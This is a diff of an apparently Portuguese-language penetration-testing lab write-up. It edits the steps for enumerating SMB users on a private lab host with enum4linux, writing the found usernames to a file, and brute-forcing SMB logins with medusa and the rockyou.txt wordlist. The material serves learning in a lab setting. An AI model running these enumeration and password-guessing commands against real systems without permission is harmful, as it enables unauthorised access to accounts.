@@ -87,11 +87,13 @@ Etapa 1: Enumeração de usuários
 
 enum4linux -U 192.168.56.105
 
+* Foi criado o arquivo users.txt com os usuários reportados na enumeração: echo "msfadmin\nadmin\nuser" > users.txt
+
 
 Etapa 2: Ataque SMB
 
 
-medusa -h 192.168.56.101 -U users.txt -P rockyou.txt -M smbnt
+medusa -h 192.168.56.105 -U users.txt -P rockyou.txt -M smbnt
 
 
 Resultado:
@@ -101,7 +103,7 @@ Acesso obtido via SMB com usuário válido
 
 Wordlists
 
-Utilizada a wordlist **rockyou.txt**, já inclusa no Kali Linux, que conta com vários parâmetros sem a necessidade real de criar uma lista ampla:
+Utilizada a wordlist rockyou.txt, já inclusa no Kali Linux, que conta com vários parâmetros sem a necessidade real de criar uma lista ampla:
 
 
 /usr/share/wordlists/rockyou.txt
